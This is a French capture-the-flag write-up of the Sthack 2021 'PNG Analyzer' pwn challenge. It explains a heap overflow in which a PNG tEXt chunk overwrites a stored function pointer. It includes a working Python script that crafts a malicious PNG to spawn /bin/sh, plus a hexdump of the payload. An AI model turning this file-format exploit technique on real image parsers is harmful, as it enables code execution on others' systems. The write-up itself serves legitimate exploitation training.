---
title: PWN - PNG Analyzer
category: Sthack2021
author: vaelio
tags:
- sthack2021
- pwn
- ctf
description: "Writeup Sthack 2021 - PNG Analyzer - PWN"
---
Introduction
===
Pour ce challenge il faut d'abord réussir à télécharger le binaire à exploiter. 
Lorsqu'on se connecte à l'index du site on peut remarquer que le site tente de charger http://dev.img.local/troll.png. 
Or ce nom de domaine ne résouds pas. C'est notre hint. Ici on va simplement éditer notre `/etc/hosts` afin de faire pointer localement le nom de domaine vers l'ip originale.
A partir de là, dans le dossier upload, on peut trouver le binaire `png_analyzer`

Voila les info du programme:

```
~ 
❯ file ./Downloads/png_analyzer
./Downloads/png_analyzer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=94ea393d939b2f7e83e650bbe1206da5a834e15e, for GNU/Linux 3.2.0, not stripped

~ 
❯ checksec ./Downloads/png_analyzer
[*] '/home/user/Downloads/png_analyzer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

TL;DR
===
En résumé le programme va prendre en argument un fichier à analyser, vérfier que le fichier est bien un PNG, va ensuite analyser chaque bloc de donnée du PNG et affichera les meta donnée de tous les blocs de type `tEXt` avant de finir par exécuter la fonction `do_nothing` avec en paramètre le titre du bloc.

Par exemple, si nous avons dans notre PNG un bloc de type `tEXt` dont le titre est `Comment` alors le programme exécutera `do_nothing("Comment")`. La preuve en image:

![]({{site.url}}/static/upload_4a219d9ebbc5642622f99991aeacddb1.png)

Exploitation
===
Lorsqu'on reverse le binaire une chose nous saute aux yeux, le pointer vers `do_nothing` est stocké pour chaque bloc d'information dans le chunk qui lui est associé dans la `heap`.

![]({{site.url}}/static/upload_14379e33db0d981f8667232307814ae2.png)

Voici, en pseudocode, la fonction `parse_chunk` qui parse les fameux bloc PNG:


![]({{site.url}}/static/upload_5a14c7c981fb9ec115bd91481ce42059.png)

On peut remarquer que l'écriture du pointer vers `do_nothing` se fait avant le `memcpy`. 

On constate également que le programme va chercher le pointer vers `do_nothing` avant de l'exécuter:
![]({{site.url}}/static/upload_8ae580cbfd8fc90299c540388bbf84e2.png)

**Bingo !** Il suffit donc que notre chunk puisse réécrire ce pointer.

En conclusion, il faut donc:
- que notre fichier soit un PNG
- que notre fichier contienne une donnée EXIF de type `tEXt` (par exemple Comment)
- que la valeur de cette donnée réécrive le pointeur vers `do_nothing`
- que rien ne crash :D

Voilà rapidement un petit script assez moche permettant d'obtenir un fichier qui nous donnera un shell local:

```python
#!/bin/env python3

from struct import pack
from os import system
import png


def mkImg():
    i = []
    for x in range(21):
        i.append([0,0,0,0])
    png.from_array(i, 'L').save("/tmp/test")
    buf = 'A'*0x1ffc + pack('<Q', 0x401160)
    with open('/tmp/buf', "w") as fd:
        fd.write(buf)
    system("exiftool -Comment=$(cat /tmp/buf) /tmp/test")
    with open("/tmp/test", "rb") as fd:
        content = fd.read()
    return content


def w(data):
    with open("/tmp/f", "wb") as fd:
        fd.write(data)



def main():
    data = mkImg()
    data = data[:41] + "/bin/sh\x00" + data[49:]
    w(data)



if __name__ == '__main__':
    main()


```


En bonus, un petit hexdump du fichier final et un exiftool
```
~
❯ hexdump -C /tmp/f
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 04 00 00 00 15  08 00 00 00 00 44 10 10  |.............D..|
00000020  9c 00 00 20 07 74 45 58  74 2f 62 69 6e 2f 73 68  |... .tEXt/bin/sh|
00000030  00 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |.AAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00002020  41 41 41 41 41 41 41 41  41 41 41 41 41 60 11 40  |AAAAAAAAAAAAA`.@|
00002030  76 b8 6c 27 00 00 00 0c  49 44 41 54 78 9c 63 60  |v.l'....IDATx.c`|
00002040  a0 13 00 00 00 69 00 01  11 3e ed a7 00 00 00 00  |.....i...>......|
00002050  49 45 4e 44 ae 42 60 82                           |IEND.B`.|
00002058
```

```
~
❯ exiftool /tmp/f
ExifTool Version Number         : 12.30
File Name                       : f
Directory                       : /tmp
File Size                       : 8.1 KiB
File Modification Date/Time     : 2021:10:18 12:29:49+02:00
File Access Date/Time           : 2021:10:18 17:04:07+02:00
File Inode Change Date/Time     : 2021:10:18 12:29:49+02:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 4
Image Height                    : 21
Bit Depth                       : 8
Color Type                      : Grayscale
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Binsh                           : AAAA[REDACTED]AAAA`.@
Image Size                      : 4x21
Megapixels                      : 0.000084
```

Conclusion
===
Un petit challenge plutot simple mais intéressant :+1: 
